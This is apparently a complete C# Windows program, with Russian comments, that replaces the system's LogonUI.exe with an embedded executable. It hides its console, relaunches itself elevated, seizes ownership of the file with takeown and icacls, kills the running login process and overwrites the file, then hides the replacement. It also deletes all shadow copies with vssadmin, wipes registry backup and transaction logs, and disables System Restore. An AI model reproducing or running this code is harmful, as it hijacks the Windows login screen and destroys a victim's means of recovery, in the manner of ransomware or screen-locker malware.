// Installer.cs - Убиваем только LogonUI процесс + поиск по всем дискам + полное снятие защит + без окон + запуск нового LogonUI
using System;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Linq;

namespace LogonUIInstaller
{
    class Program
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetPriorityClass(IntPtr hProcess, uint dwPriorityClass);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetProcessDEPPolicy(IntPtr hProcess, uint dwFlags);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const uint HIGH_PRIORITY_CLASS = 0x00000080;
        private const uint PROCESS_DEP_ENABLE = 0x00000001;
        private const int SW_HIDE = 0;

        static void Main(string[] args)
        {
            // Скрываем консольное окно
            IntPtr consoleWindow = GetConsoleWindow();
            if (consoleWindow != IntPtr.Zero)
                ShowWindow(consoleWindow, SW_HIDE);

            try
            {
                if (!IsAdministrator())
                {
                    RunAsAdministrator();
                    return;
                }

                SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
                SetProcessDEPPolicy(GetCurrentProcess(), PROCESS_DEP_ENABLE);

                string originalPath = FindLogonUI();
                
                if (string.IsNullOrEmpty(originalPath) || !File.Exists(originalPath))
                {
                    originalPath = Path.Combine(
                        Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows",
                        "System32",
                        "LogonUI.exe"
                    );
                }

                if (!File.Exists(originalPath))
                {
                    try
                    {
                        File.WriteAllText(@"C:\Windows\Temp\~logonui_error.log", "LogonUI.exe не найден!");
                    }
                    catch { }
                    return;
                }

                // Полное снятие всех защит
                ForceFullAccess(originalPath);

                byte[] customLogonUI = ExtractResource("LogonUI.exe");

                KillLogonUIProcesses();

                if (File.Exists(originalPath))
                {
                    File.SetAttributes(originalPath, FileAttributes.Normal);
                    
                    for (int i = 0; i < 5; i++)
                    {
                        try
                        {
                            File.Delete(originalPath);
                            break;
                        }
                        catch
                        {
                            System.Threading.Thread.Sleep(1000);
                            try
                            {
                                File.Move(originalPath, originalPath + ".del");
                                File.Delete(originalPath + ".del");
                                break;
                            }
                            catch { }
                        }
                    }
                }

                File.WriteAllBytes(originalPath, customLogonUI);

                // Устанавливаем только атрибуты (без запрета доступа)
                try
                {
                    File.SetAttributes(originalPath, FileAttributes.System | FileAttributes.ReadOnly | FileAttributes.Hidden);
                }
                catch { }

                DestroySystemBackups(originalPath);
                
                // ЗАПУСКАЕМ НОВЫЙ LogonUI ВМЕСТО BSOD
                try
                {
                    ProcessStartInfo psi = new ProcessStartInfo
                    {
                        FileName = originalPath,
                        UseShellExecute = true,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Normal
                    };
                    Process.Start(psi);
                }
                catch { }
                
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                try
                {
                    using (var fs = new FileStream(@"C:\Windows\Temp\~tmp.log", FileMode.Create))
                    using (var sw = new StreamWriter(fs))
                    {
                        sw.Write(ex.ToString());
                    }
                }
                catch { }
                Environment.Exit(1);
            }
        }

        private static void ForceFullAccess(string path)
        {
            try
            {
                File.SetAttributes(path, FileAttributes.Normal);
            }
            catch { }

            try
            {
                ProcessStartInfo takeown = new ProcessStartInfo
                {
                    FileName = "takeown.exe",
                    Arguments = $"/f \"{path}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                using (Process p = Process.Start(takeown))
                {
                    if (p != null)
                        p.WaitForExit(3000);
                }
            }
            catch { }

            try
            {
                ProcessStartInfo icacls = new ProcessStartInfo
                {
                    FileName = "icacls.exe",
                    Arguments = $"\"{path}\" /grant Everyone:F /t",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                using (Process p = Process.Start(icacls))
                {
                    if (p != null)
                        p.WaitForExit(3000);
                }
            }
            catch { }

            try
            {
                FileInfo fileInfo = new FileInfo(path);
                FileSecurity fileSecurity = fileInfo.GetAccessControl();
                
                fileSecurity.SetOwner(WindowsIdentity.GetCurrent().User);
                
                NTAccount account = new NTAccount(Environment.UserDomainName, Environment.UserName);
                FileSystemAccessRule rule = new FileSystemAccessRule(account, 
                    FileSystemRights.FullControl, AccessControlType.Allow);
                fileSecurity.AddAccessRule(rule);
                
                NTAccount systemAccount = new NTAccount("NT AUTHORITY\\SYSTEM");
                FileSystemAccessRule systemRule = new FileSystemAccessRule(systemAccount, 
                    FileSystemRights.FullControl, AccessControlType.Allow);
                fileSecurity.AddAccessRule(systemRule);
                
                fileInfo.SetAccessControl(fileSecurity);
            }
            catch { }

            try
            {
                File.SetAttributes(path, FileAttributes.Normal);
            }
            catch { }
        }

        private static string FindLogonUI()
        {
            string[] possiblePaths = {
                @"C:\Windows\System32\LogonUI.exe",
                @"C:\WINDOWS\System32\LogonUI.exe",
                @"C:\Windows\system32\LogonUI.exe",
                @"C:\WINDOWS\system32\LogonUI.exe",
                @"C:\WinNT\System32\LogonUI.exe",
                Environment.ExpandEnvironmentVariables(@"%SystemRoot%\System32\LogonUI.exe"),
                Environment.ExpandEnvironmentVariables(@"%WINDIR%\System32\LogonUI.exe")
            };
            
            foreach (string path in possiblePaths)
            {
                try
                {
                    if (File.Exists(path))
                        return path;
                }
                catch { }
            }
            
            try
            {
                foreach (DriveInfo drive in DriveInfo.GetDrives())
                {
                    if (drive.IsReady && drive.DriveType == DriveType.Fixed)
                    {
                        try
                        {
                            string root = drive.Name;
                            
                            string[] windowsDirs = { "Windows", "WINDOWS", "WinNT" };
                            foreach (string winDir in windowsDirs)
                            {
                                string system32Path = Path.Combine(root, winDir, "System32", "LogonUI.exe");
                                if (File.Exists(system32Path))
                                    return system32Path;
                                
                                string system32lower = Path.Combine(root, winDir, "system32", "LogonUI.exe");
                                if (File.Exists(system32lower))
                                    return system32lower;
                            }
                            
                            string windowsPath = Path.Combine(root, "Windows");
                            if (Directory.Exists(windowsPath))
                            {
                                foreach (string dir in Directory.GetDirectories(windowsPath))
                                {
                                    try
                                    {
                                        string checkPath = Path.Combine(dir, "LogonUI.exe");
                                        if (File.Exists(checkPath))
                                            return checkPath;
                                    }
                                    catch { }
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }
            
            return null;
        }

        private static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static void RunAsAdministrator()
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = Assembly.GetEntryAssembly().Location;
            psi.UseShellExecute = true;
            psi.Verb = "runas";
            psi.CreateNoWindow = true;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            try
            {
                Process.Start(psi);
            }
            catch { }
            Environment.Exit(0);
        }

        private static void DestroySystemBackups(string originalPath)
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "vssadmin.exe",
                    Arguments = "delete shadows /all /quiet",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });

                string[] backupPaths = {
                    @"C:\Windows\System32\config\RegBack\*",
                    @"C:\Windows\System32\config\*.LOG*",
                    @"C:\Windows\System32\config\*.blf",
                    @"C:\Windows\System32\config\*.regtrans-ms",
                    @"C:\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache\*",
                    @"C:\Windows\ServiceProfiles\NetworkService\AppData\Local\FontCache\*"
                };

                foreach (string path in backupPaths)
                {
                    try
                    {
                        if (path.Contains("*"))
                        {
                            string dir = Path.GetDirectoryName(path);
                            if (Directory.Exists(dir))
                            {
                                foreach (string file in Directory.GetFiles(dir, Path.GetFileName(path)))
                                {
                                    try { File.Delete(file); } catch { }
                                }
                            }
                        }
                        else if (File.Exists(path))
                        {
                            File.Delete(path);
                        }
                    }
                    catch { }
                }

                Process.Start(new ProcessStartInfo
                {
                    FileName = "reg.exe",
                    Arguments = "add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore /v DisableSR /t REG_DWORD /d 1 /f",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });

            }
            catch { }
        }

        private static void KillLogonUIProcesses()
        {
            try
            {
                Process[] logonProcesses = Process.GetProcessesByName("LogonUI");
                
                foreach (Process process in logonProcesses)
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(process.MainModule.FileName) && 
                            process.MainModule.FileName.Contains("System32"))
                        {
                            process.Kill();
                            process.WaitForExit(3000);
                            System.Threading.Thread.Sleep(500);
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        private static byte[] ExtractResource(string resourceName)
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            
            using (Stream stream = assembly.GetManifestResourceStream(resourceName))
            {
                if (stream != null)
                {
                    byte[] data = new byte[stream.Length];
                    stream.Read(data, 0, data.Length);
                    return data;
                }
            }
            
            string fullName = $"LogonUIInstaller.{resourceName}";
            using (Stream fallbackStream = assembly.GetManifestResourceStream(fullName))
            {
                if (fallbackStream == null)
                    throw new Exception($"Ресурс {resourceName} не найден");
                
                byte[] data = new byte[fallbackStream.Length];
                fallbackStream.Read(data, 0, data.Length);
                return data;
            }
        }
    }
}
